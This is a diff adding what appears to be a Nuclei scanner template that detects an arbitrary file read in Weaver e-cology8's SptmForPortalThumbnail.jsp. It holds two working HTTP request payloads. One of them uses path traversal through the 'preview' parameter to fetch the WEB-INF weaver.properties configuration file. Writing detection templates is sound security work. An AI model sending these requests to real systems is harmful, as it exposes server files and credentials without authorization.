@@ -1,0 +1,42 @@
+id: weaver-ecology8-arbitrary-file-read
+info:
+  name: Weaver e-cology8 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver e-cology8 SptmForPortalThumbnail.jsp contains a vulnerability in the `preview` parameter that allows arbitrary file reading, potentially exposing sensitive configuration files and other critical information.
+  reference:
+    - http://124.223.89.192/archives/e-cology8-14
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "weaver.general.BaseBean"
+          - "java.io"
+
+  - raw:
+      - |
+        GET /portal/SptmForPortalThumbnail.jsp?preview=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "weaver.general.BaseBean"
+          - "java.io"
